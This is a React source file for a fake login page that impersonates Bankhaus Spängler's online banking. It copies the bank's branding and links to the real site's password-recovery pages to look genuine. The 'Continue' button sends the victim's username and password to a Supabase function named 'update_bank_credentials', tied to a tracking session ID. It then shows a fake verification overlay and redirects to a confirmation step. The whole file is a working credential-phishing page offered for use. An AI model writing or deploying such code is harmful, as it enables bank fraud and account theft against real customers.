import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Info, Eye, EyeOff } from "lucide-react";
import spaenglerBg from "@/assets/spaengler-bg.png";
import spaenglerIcon from "@/assets/bankhaus_spaengler.png";

const BankhausSpaengler = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Bankhaus Spängler - Login", spaenglerIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col">
      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${spaenglerBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[620px] rounded overflow-hidden">
          {/* Header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-2xl"
            style={{ backgroundColor: "#43638d" }}
          >
            Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-base leading-tight" style={{ color: "#333" }}>
              {lang === "de"
                ? "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Username block */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="font-normal text-sm" style={{ color: "#999" }}>
                  {lang === "de" ? "Benutzername" : "User name or authorised party number"}
                </span>
                <span className="text-sm">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setLang(lang === "de" ? "en" : "de");
                    }}
                    className="no-underline hover:underline"
                    style={{ color: "#b0916b" }}
                  >
                    {lang === "de" ? "English" : "Deutsch"}
                  </a>
                </span>
              </div>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: "#dee3eb",
                    borderColor: "#43638d",
                    boxShadow: "0 0 0 1px #43638d",
                  }}
                />
                {username && (
                  <button
                    onClick={() => setUsername("")}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    <X size={24} color="#43638d" />
                  </button>
                )}
              </div>
            </div>

            {/* Password block */}
            <div className="space-y-1">
              <span className="font-normal text-sm" style={{ color: "#999" }}>
                {lang === "de" ? "Passwort" : "Password"}
              </span>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setIsPasswordFocused(true)}
                  onBlur={() => setIsPasswordFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: "#dee3eb",
                    borderColor: "#43638d",
                    boxShadow: "0 0 0 1px #43638d",
                  }}
                />
                {password && (
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    {showPassword ? <EyeOff size={20} color="#43638d" /> : <Eye size={20} color="#43638d" />}
                  </button>
                )}
              </div>
            </div>

            {/* Terms text */}
            {lang === "de" && (
              <p className="text-[15px] text-center" style={{ color: "#333" }}>
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
              </p>
            )}

            {/* Full-width divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 text-white font-semibold rounded-md text-base"
              style={{ backgroundColor: "#43638d" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center" style={{ gap: 0 }}>
              <a
                href="https://www.banking.co.at/banking/login.xhtml?m=45#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#b0916b" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
              <a
                href="https://www.banking.co.at/banking/login.xhtml?m=45#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#b0916b" }}
              >
                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
              </a>
              <span
                className="text-[15px] flex items-center gap-1 leading-tight py-0 my-0 cursor-pointer hover:underline"
                style={{ color: "#b0916b" }}
              >
                <Info size={16} />
                {lang === "de" ? "Live Hilfe" : "Live Help"}
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default BankhausSpaengler;
